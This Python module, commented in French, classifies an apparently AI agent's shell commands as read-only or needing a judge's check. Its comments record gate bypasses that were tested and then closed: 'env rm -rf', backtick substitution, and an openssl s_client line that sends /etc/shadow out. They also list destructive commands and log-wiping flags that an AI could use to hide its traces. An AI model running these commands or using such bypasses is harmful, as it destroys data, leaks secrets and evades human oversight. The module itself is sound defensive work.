# ════════════════════════════════════════════════════════════════════════════
#  MODÈLE DE RISQUE — ALLOWLIST (défaut = vérification)
#
#  L'ancienne version était une blocklist de regex appliquées à la ligne shell
#  entière. Elle échouait dans les DEUX sens :
#    · faux positifs — `echo\s+.*?>\s*/` matchait n'importe quel `echo` suivi
#      plus loin d'un `2>/dev/null`, donc `ps`, `cat`, `apt list` étaient
#      classés dangereux et bloqués ;
#    · faux négatifs — tout ce qui n'était pas listé passait sans contrôle :
#      reboot, dd, mkfs, mv, kill, iptables, userdel, curl|bash, perl -i…
#  On inverse : une commande n'échappe à la vérification que si CHACUN de ses
#  segments est prouvé en lecture seule. L'inconnu est vérifié, pas autorisé.
# ════════════════════════════════════════════════════════════════════════════
_RO_BINARIES = {
    "ls", "cat", "head", "tail", "wc", "nl", "tac", "strings", "file", "stat",
    # `cd` EXPLIQUAIT 24 DES 73 REFUS RECENTS, a lui seul. Mesure :
    #     libre   sed -n '4133,4200p' /opt/cassandra/cassandra.py
    #     JUGE    cd /opt/cassandra && sed -n '4133,4200p' cassandra.py
    # Le seul mot qui change est `cd`. C'etait le handicap : Cassandra ne
    # pouvait pas lire son propre code sans attendre un verdict.
    #
    # DEUX OBJECTIONS ONT ETE FAITES, ET MESUREES :
    #  · « le PWD devient un etat invisible qui persiste » — NON : l'executeur
    #    fait `subprocess.run(cmd, shell=True)` sans `cwd`, donc un bash NEUF a
    #    chaque commande. Le `cd` ne survit pas a la ligne, et il est ecrit sur
    #    cette meme ligne, sous les yeux de qui relit le journal.
    #  · « cd /etc && cat shadow deviendrait libre » — il l'est DEJA :
    #    `cat /etc/shadow` par chemin absolu est prouve en lecture depuis
    #    toujours. `cd` n'ajoute donc aucun pouvoir ; il en masquait un a
    #    l'analyse, sans en donner.
    "cd", "pushd", "popd",
    "readlink", "realpath", "basename", "dirname", "echo", "printf", "true",
    "false", "test", "date", "uptime", "uname", "hostname", "hostnamectl",
    "whoami", "id", "groups", "pwd", "df", "du", "free", "vmstat", "iostat",
    "mpstat", "nproc", "lscpu", "lsblk", "blkid", "lsusb", "lspci", "dmidecode",
    "sensors", "ps", "pgrep", "pidof", "pstree", "top", "htop", "ss", "netstat",
    "lsof", "ip", "ifconfig", "route", "arp", "ping", "ping6", "dig", "host",
    "nslookup", "traceroute", "mtr", "whois", "getent", "grep", "egrep", "fgrep",
    "rg", "awk", "gawk", "sed", "cut", "sort", "uniq", "tr", "column", "paste",
    "join", "comm", "diff", "cmp", "md5sum", "sha1sum", "sha256sum", "seq",
    "sleep", "which", "whereis", "type", "printenv", "locale", "dmesg",
    "journalctl", "last", "lastlog", "who", "w", "zcat", "zgrep", "jq", "xxd",
    "od", "base64", "find", "fuser", "runlevel", "dpkg-query", "needrestart",
    "crontab", "openssl", "curl", "wc", "sqlite3",
}
# Binaires à double usage : sûrs UNIQUEMENT avec ces sous-commandes.
_RO_SUBCOMMANDS = {
    "systemctl": {"status", "is-active", "is-enabled", "is-failed", "list-units",
                  "list-unit-files", "list-timers", "list-sockets", "show", "cat",
                  "get-default", "list-dependencies", "list-jobs"},
    "apt":       {"list", "show", "policy", "search", "depends", "rdepends"},
    "apt-get":   {"check"},
    "apt-cache": {"policy", "show", "showpkg", "search", "depends", "madison", "stats"},
    "dpkg":      {"-l", "-L", "-s", "-S", "-p", "--list", "--status", "--audit",
                  "--search", "--listfiles", "--print-architecture", "--get-selections"},
    "docker":    {"ps", "images", "logs", "inspect", "version", "info", "stats",
                  "top", "port", "diff"},
    "git":       {"status", "log", "diff", "show", "branch", "remote", "describe",
                  "blame", "rev-parse", "ls-files", "tag"},
    "tailscale": {"status", "version", "ip", "netcheck", "whois", "ping"},
    "nginx":     {"-t", "-v", "-V", "-T"},
    "certbot":   {"certificates"},
    "ufw":       {"status"},
    "pip":       {"list", "show", "freeze"},
    "pip3":      {"list", "show", "freeze"},
    "npm":       {"list", "ls", "view", "outdated"},
    "python3":   {"--version", "-V"},
    "perl":      {"-v", "-c", "--version"},
}
# Enveloppes transparentes : on regarde ce qu'elles exécutent réellement.
# `env` A ETE RANGE DU MAUVAIS COTE, et c'etait la clef maitresse : tant qu'il
# figurait parmi les lecteurs, TROIS SIGNES devant n'importe quelle commande la
# rendaient « prouvee en lecture seule ». `env rm -rf /tmp/zz` etait libre ; le
# temoin a bien ete supprime. Ici, `_resolve_binary` le saute et va voir ce
# qu'il lance vraiment — c'est ce que faisaient deja `nohup`, `nice` et
# `timeout`, qui, eux, etaient corrects depuis toujours.
_WRAPPERS = {"sudo", "nohup", "command", "builtin", "exec", "stdbuf", "nice",
             "ionice", "time", "env", "setsid"}
_WRAPPERS_ONE_ARG = {"timeout"}          # `timeout 5 <cmd>` : un argument à sauter
_REDIR_SAFE_TARGETS = {"/dev/null", "/dev/stderr", "/dev/stdout", "&1", "&2", "1", "2"}
_SEGMENT_SEPARATORS = {";", "|", "||", "&&", "&", "\n"}

# Conservé : le nom est référencé par le garde d'auto-évolution (_CRITICAL_MARKERS).
# Ce n'est plus le mécanisme de décision — seulement des repères explicites.
RISKY_PATTERNS = [
    r'\brm\s+-[rf]', r'\bdd\s+if=', r'\bmkfs', r'\breboot\b', r'\bshutdown\b',
    r'\bsed\s+-i\b', r'\b(perl|python3?|ruby)\s+.*-i\b', r'\bchmod\b', r'\bchown\b',
    r'\btee\b', r'\bkill(all)?\b', r'\bpkill\b', r'\buserdel\b', r'\bmkswap\b',
    r'\biptables\b', r'\bsystemctl\s+(stop|disable|mask|restart)\b', r'\btruncate\b',
]


def _split_segments(cmd: str):
    """Découpe une ligne shell en segments (une commande par segment).
    Retourne None si la ligne n'est pas analysable — l'appelant doit alors
    traiter la commande comme risquée (fail-closed)."""
    import shlex
    lexer = shlex.shlex(cmd, posix=True, punctuation_chars=True)
    lexer.whitespace_split = True
    try:
        tokens = list(lexer)
    except ValueError:
        return None                       # guillemets non fermés, etc.
    segments, cur = [], []
    for tok in tokens:
        if tok in _SEGMENT_SEPARATORS:
            segments.append(cur)
            cur = []
        else:
            cur.append(tok)
    segments.append(cur)
    return [s for s in segments if s]


def _resolve_binary(tokens):
    """(binaire, arguments) après avoir sauté les préfixes VAR=x et les enveloppes."""
    i = 0
    while i < len(tokens):
        t = tokens[i]
        if re.fullmatch(r'[A-Za-z_][A-Za-z0-9_]*=.*', t):
            i += 1
        elif t in _WRAPPERS:
            i += 1
        elif t in _WRAPPERS_ONE_ARG:
            i += 2
        else:
            break
    if i >= len(tokens):
        return "", []
    return tokens[i].rsplit("/", 1)[-1], tokens[i + 1:]


_OPENSSL_DANGER = {
    "req", "genrsa", "genpkey", "enc", "pkeyutl", "rsautl", "dgst", "smime",
    "cms", "ca", "s_client", "s_server", "s_time", "rand", "passwd", "ts",
}
_CURL_ENVOI = {
    "-d", "--data", "--data-raw", "--data-binary", "--data-urlencode",
    "--data-ascii", "-F", "--form", "--form-string", "-T", "--upload-file",
    "-K", "--config",
}
# Des adresses, puis `p`, `d` ou `q`. La plage calculee — « $((L-6)),$((L+4))p »
# — est admise telle quelle : c'est la facon dont Cassandra lit son code, et
# l'ecarter aurait rouvert le handicap qu'on vient de fermer.
_SED_SUR = re.compile(r"^\s*(?:\$\(\([^()]*\)\)|[0-9$,~+])*\s*[pdq]\s*$")


def _sed_scripts(args) -> list:
    """Le PROGRAMME de sed, sans les fichiers qu'il lit.

    Le premier argument qui n'est pas un drapeau EST le script ; ceux d'apres
    sont des fichiers. Les confondre ferait refuser « sed -n '1,5p'
    cassandra.py » a cause du nom de fichier — exactement la lecture qu'on
    cherche a rendre libre.
    """
    out, i = [], 0
    while i < len(args):
        a = args[i]
        if a in ("-e", "--expression"):
            if i + 1 < len(args):
                out.append(args[i + 1])
            i += 2
            continue
        if a.startswith("--expression="):
            out.append(a.split("=", 1)[1])
            i += 1
            continue
        if a.startswith("-"):
            i += 1
            continue
        out.append(a)          # le script ; la suite est faite de fichiers
        break
    return out


def _segment_is_readonly(tokens) -> bool:
    """Vrai UNIQUEMENT si l'on peut prouver que ce segment ne modifie rien."""
    binary, args = _resolve_binary(tokens)
    if not binary:
        return False
    # `--option=valeur` ET `--option valeur` DESIGNENT LA MEME CHOSE. Les
    # regles ci-dessous comparent des noms d'options exacts ; sans cette
    # normalisation, la forme avec `=` passerait au travers. Aucun trou n'a ete
    # constate sur les outils d'ici — `curl --output=` et `diff --output=`
    # repondent « unrecognized option » — mais la comparaison exacte est une
    # fragilite gratuite : le jour ou l'un les acceptera, la regle cessera de
    # mordre sans que rien ne le dise. `args` garde sa forme d'origine ; on ne
    # regarde les noms nus que pour decider.
    _noms = [a.split("=", 1)[0] if a.startswith("--") and "=" in a else a
             for a in args]
    # Toute redirection vers autre chose que /dev/null écrit un fichier.
    for j, t in enumerate(args):
        if t in (">", ">>", "<>"):
            target = args[j + 1] if j + 1 < len(args) else ""
            if target not in _REDIR_SAFE_TARGETS:
                return False
    # Un drapeau de simulation rend l'opération inoffensive (apt-get -s…).
    if binary in ("apt", "apt-get", "aptitude", "dpkg", "yum", "dnf") and any(
            a in ("-s", "--simulate", "--dry-run", "--just-print", "--no-act",
                  "--assume-no") for a in args):
        return True
    if binary in _RO_SUBCOMMANDS:
        allowed = _RO_SUBCOMMANDS[binary]
        sub = next((a for a in args if not a.startswith("-")), None)
        first = args[0] if args else ""
        return (sub in allowed) or (first in allowed)
    if binary not in _RO_BINARIES:
        return False
    # Options qui transforment un binaire « sûr » en outil d'écriture.
    if binary in ("sed", "awk", "gawk", "perl") and any(a.startswith("-i") for a in args):
        return False
    if binary == "find" and any(a in ("-delete", "-exec", "-execdir", "-ok") for a in args):
        return False
    if binary in ("fuser", "lsof") and any(a.startswith("-k") for a in args):
        return False
    # OPENSSL FAIT BIEN PLUS QUE DES CLEFS. `s_client` ouvre une session TLS —
    # « openssl s_client -connect ailleurs:443 < /etc/shadow » fait sortir le
    # fichier — et `-out` ecrit, sous `enc`, `pkeyutl`, `dgst` et d'autres.
    # Seules trois sous-commandes etaient ecartees.
    if binary == "openssl":
        if any(n in _OPENSSL_DANGER for n in _noms):
            return False
        if any(a in ("-out", "-keyout", "-signature", "-sigfile") for a in args):
            return False
    # SQLITE GARANTIT LUI-MEME LE `-readonly`, et c'est ce qui le distingue
    # d'une expression sur du SQL : « CREATE TABLE » y repond « attempt to
    # write a readonly database », mesure. Sans ce drapeau on ne prouve rien —
    # une requete peut commencer par SELECT et finir par un DELETE.
    #
    # `ATTACH` est ecarte par prudence, et il faut dire pourquoi : l'ecriture
    # dans une base attachee a ete ESSAYEE et REFUSEE par SQLite (« unable to
    # open database »), donc ce n'est pas un trou constate. Ce qu'ATTACH permet
    # vraiment, c'est de LIRE une autre base — ce qui est deja libre par chemin
    # absolu. On l'ecarte parce que la ligne coute peu, pas parce qu'elle
    # colmate quelque chose.
    if binary == "sqlite3":
        if not any(a in ("-readonly", "--readonly") for a in args):
            return False
        if re.search(r"(?i)\battach\b", " ".join(args)):
            return False
    # JOURNALCTL N'EST PAS QU'UN LECTEUR : `--vacuum-size`, `--vacuum-time` et
    # `--rotate` DETRUISENT des journaux. Une IA qui efface ses propres traces
    # ne doit pas pouvoir le faire sans qu'on le lui demande.
    if binary == "journalctl" and any(
            n in ("--rotate", "--flush", "--sync", "--relinquish-var")
            or n.startswith("--vacuum") for n in _noms):
        return False
    # `dmesg -C` VIDE LE TAMPON DU NOYAU — c'est une destruction, et c'est le
    # geste de qui efface ses traces. `-c` lit puis vide.
    if binary == "dmesg" and any(
            n in ("-C", "-c", "--clear", "--read-clear") for n in _noms):
        return False
    if binary == "crontab" and "-l" not in args:
        return False
    # CURL EST UN OUTIL D'ENVOI AUTANT QUE DE LECTURE. Seuls les drapeaux
    # d'ECRITURE LOCALE etaient vus ; ceux qui font SORTIR un fichier — -d, -F,
    # -T, --data-binary — ne l'etaient pas. Et `-K` charge des options depuis
    # un fichier, donc n'importe lesquelles, sans qu'elles paraissent ici.
    if binary == "curl":
        if any(n in _CURL_ENVOI or n.startswith("--data") or n.startswith("--form")
               for n in _noms):
            return False
        if any(n in ("-O", "--remote-name", "--remote-name-all") for n in _noms):
            return False
        # `-o /dev/null` RESTE LIBRE, et ce n'est pas une faveur : c'est LE
        # controle de sante que Cassandra passe sur son propre service. Le lui
        # refuser, c'etait le handicap qu'on corrige.
        for j, a in enumerate(args):
            if a in ("-o", "--output"):
                if (args[j + 1] if j + 1 < len(args) else "") not in _REDIR_SAFE_TARGETS:
                    return False
    # AWK EST UN INTERPRETE. `system()` lance ce qu'il veut, `print > "f"` ecrit
    # un fichier, et le `>` d'un programme awk n'est pas une redirection shell :
    # il vit dans une chaine quotee, invisible au controle des redirections.
    # On garde la forme courante — « awk '{print $1}' » — et on soumet le reste.
    if binary in ("awk", "gawk", "mawk", "nawk"):
        if any(a in ("-f", "--file", "--exec", "--source", "-E") for a in args):
            return False
        if re.search(r"system\s*\(|close\s*\(|ENVIRON|getline|[>|]",
                     " ".join(args)):
            return False
    # SED AUSSI, DES QU'ON SORT DE L'IMPRESSION DE LIGNES : `w` ecrit un
    # fichier, `e` execute une commande, `-f` lit un programme ailleurs. On ne
    # prouve donc QUE la forme qui sert tous les jours — des adresses et `p`,
    # `d` ou `q`, la plage calculee comprise. Tout le reste, `s/a/b/` inclus,
    # passe par le juge : ce n'est pas un refus, c'est une question posee.
    if binary == "sed":
        if any(a in ("-f", "--file") or a.startswith("--file=")
               or (a.startswith("-f") and len(a) > 2) for a in args):
            return False
        for _s in _sed_scripts(args):
            if _SED_SUR.match(_s):
                continue
            # `s/foo/bar/` EST UN FILTRE DE LECTURE : il ecrit sur la sortie,
            # pas sur le disque. Le fermer etait un exces de mon correctif —
            # c'est l'usage quotidien de sed. Le danger vient des drapeaux `e`
            # (execute le resultat) et `w` (ecrit un fichier), et d'eux seuls.
            _m = re.match(r"^\s*s(.)(.*)\1([A-Za-z0-9]*)\s*$", _s, re.S)
            if _m and not re.search(r"[we]", _m.group(3)):
                continue
            return False
    # FIND SAIT ECRIRE SANS -exec : `-fprintf` depose un fichier.
    if binary == "find" and any(
            a in ("-fprintf", "-fprint", "-fprint0", "-fls") for a in args):
        return False
    # XXD PREND UN FICHIER DE SORTIE EN SECOND OPERANDE, sans aucun drapeau :
    # « xxd /etc/passwd /tmp/zz » ecrit /tmp/zz.
    if binary == "xxd":
        _ops, _k = [], 0
        while _k < len(args):
            if args[_k] in ("-c", "-g", "-l", "-o", "-s", "-C"):
                _k += 2
                continue
            if args[_k].startswith("-"):
                _k += 1
                continue
            _ops.append(args[_k])
            _k += 1
        if len(_ops) >= 2:
            return False
    return True


_SUBSTITUTION = re.compile(r"`|\$\((?!\()|<\(|>\(")


def is_risky_command(cmd: str) -> bool:
    """DÉFAUT = RISQUÉ. Une commande n'échappe à la vérification que si TOUS ses
    segments sont prouvés en lecture seule."""
    if not cmd or not cmd.strip():
        return False
    # UNE COMMANDE CACHEE DANS UN ARGUMENT N'EST PAS UN SEGMENT. Le decoupage
    # voyait bien `&&`, `;`, `|` en tete de segment, mais rien de ce qui se
    # glisse DANS un argument : « echo `rm -f x` » etait donc prouve en lecture
    # seule, et le temoin bien supprime. Sept formes ont ete essayees, sept ont
    # agi. Un binaire de lecture servait d'enveloppe a n'importe quoi.
    #
    # `$((` EST DE L'ARITHMETIQUE, PAS UNE SUBSTITUTION, et l'excepter n'est
    # pas un detail : « sed -n "$((L-6)),$((L+4))p" » est la facon dont
    # Cassandra lit son propre code. L'oublier aurait referme le handicap.
    if _SUBSTITUTION.search(cmd or ""):
        return True
    segments = _split_segments(cmd)
    if segments is None:
        return True                       # non analysable -> on vérifie
    return not all(_segment_is_readonly(s) for s in segments)


# Outils qui réécrivent un fichier passé en opérande (pour les snapshots).
_INPLACE_TOOLS = {"sed", "perl", "ruby", "awk", "gawk"}
_WRITE_TOOLS = {"tee", "truncate", "install", "cp", "mv", "ln", "dd", "touch"}


def _files_to_snapshot(cmd: str) -> list:
    """Chemins absolus que la commande risque de réécrire.
    Remplace l'ancienne regex, qui ne couvrait que sed/cat/tee/echo/printf et
    ratait perl -i, dd, truncate, cp, mv et les redirections `>>`."""
    segments = _split_segments(cmd) or []
    found = []
    for tokens in segments:
        binary, args = _resolve_binary(tokens)
        for j, t in enumerate(args):
            if t in (">", ">>", "<>"):
                tgt = args[j + 1] if j + 1 < len(args) else ""
                if tgt.startswith("/") and tgt not in _REDIR_SAFE_TARGETS:
                    found.append(tgt)
            elif t.startswith("of=") and t[3:].startswith("/"):      # dd
                found.append(t[3:])
        # LES ECRITURES QUI PASSENT PAR UN DRAPEAU, et non par une redirection.
        # `_files_to_snapshot` rendait « aucun fichier » pour « curl -o »,
        # « openssl -out » et « find -fprintf » : la sauvegarde d'avant n'etait
        # pas prise, et l'on croyait pourtant pouvoir revenir. Une sauvegarde
        # qu'on croit prise et qui n'existe pas est pire que pas de sauvegarde.
        for j, t in enumerate(args):
            if t in ("-o", "--output", "-out", "-keyout", "-fprintf", "-fprint"):
                tgt = args[j + 1] if j + 1 < len(args) else ""
                if tgt.startswith("/") and tgt not in _REDIR_SAFE_TARGETS:
                    found.append(tgt)
        if binary in _WRITE_TOOLS or (
                binary in _INPLACE_TOOLS and any(a.startswith("-i") for a in args)):
            found.extend(a for a in args if a.startswith("/"))
    seen, out = set(), []
    for f in found:                       # dédoublonne en gardant l'ordre
        if f not in seen and f not in _REDIR_SAFE_TARGETS:
            seen.add(f)
            out.append(f)
    return out


def snapshot_files_before(cmd: str, session_id: str, action_id: int = 0) -> list:
    """Détecte et snapshotte les fichiers qui vont être modifiés."""
    snaps = []
    # NB : plus de filtre « le nom contient un point » — il excluait /etc/hosts,
    # /etc/passwd, /etc/fstab, /etc/crontab… soit les fichiers les plus sensibles.
    files = _files_to_snapshot(cmd)
    for fp in list(files)[:4]:
        try:
            if os.path.isfile(fp) and os.path.getsize(fp) < 300_000:
                with open(fp, 'r', errors='replace') as fh:
                    content = fh.read()
                conn = sqlite3.connect(MEMORY_DB_PATH)
                conn.execute(
                    "INSERT INTO file_snapshots (ts,session_id,trigger_command,file_path,content_before,action_id) "
                    "VALUES (datetime('now'),?,?,?,?,?)",
                    (session_id, cmd[:500], fp, content, action_id))
                conn.commit()
                sid = conn.execute("SELECT last_insert_rowid()").fetchone()[0]
                conn.close()
                snaps.append({"id": sid, "path": fp, "size": len(content)})
        except Exception:
            pass
    return snaps


def get_snapshots(limit: int = 30) -> list:
    try:
        conn = sqlite3.connect(MEMORY_DB_PATH)
        conn.row_factory = sqlite3.Row
        rows = conn.execute(
            "SELECT id,ts,session_id,trigger_command,file_path,LENGTH(content_before) as size "
            "FROM file_snapshots ORDER BY id DESC LIMIT ?", (limit,)).fetchall()
        conn.close()
        return [dict(r) for r in rows]
    except Exception:
        return []


def restore_snapshot(snap_id: int) -> dict:
    try:
        conn = sqlite3.connect(MEMORY_DB_PATH)
        conn.row_factory = sqlite3.Row
        row = conn.execute("SELECT file_path,content_before FROM file_snapshots WHERE id=?", (snap_id,)).fetchone()
        conn.close()
        if not row:
            return {"success": False, "error": "Snapshot introuvable"}
        with open(row["file_path"], 'w') as fh:
            fh.write(row["content_before"])
        return {"success": True, "path": row["file_path"]}
    except Exception as e:
        return {"success": False, "error": str(e)}


def generate_diff_html(before: str, after: str, filepath: str) -> str:
    import difflib
    diff = list(difflib.unified_diff(
        before.splitlines(keepends=True),
        after.splitlines(keepends=True),
        fromfile=f"avant",
        tofile=f"après",
        n=2
    ))
    if not diff:
        return ""
    lines_html = []
    for line in diff[:80]:
        esc = line.rstrip('\n').replace('&','&amp;').replace('<','&lt;').replace('>','&gt;')
        if line.startswith('+') and not line.startswith('+++'):
            lines_html.append(f'<div class="diff-add">+{esc[1:]}</div>')
        elif line.startswith('-') and not line.startswith('---'):
            lines_html.append(f'<div class="diff-del">-{esc[1:]}</div>')
        elif line.startswith('@@'):
            lines_html.append(f'<div class="diff-hunk">{esc}</div>')
        elif not line.startswith(('---','+++')):
            lines_html.append(f'<div class="diff-ctx"> {esc[1:]}</div>')
    fp_esc = filepath.replace('<','&lt;').replace('>','&gt;')
    return (f'<div class="diff-block"><div class="diff-title">📄 diff: {fp_esc}</div>'
            + ''.join(lines_html) + '</div>')


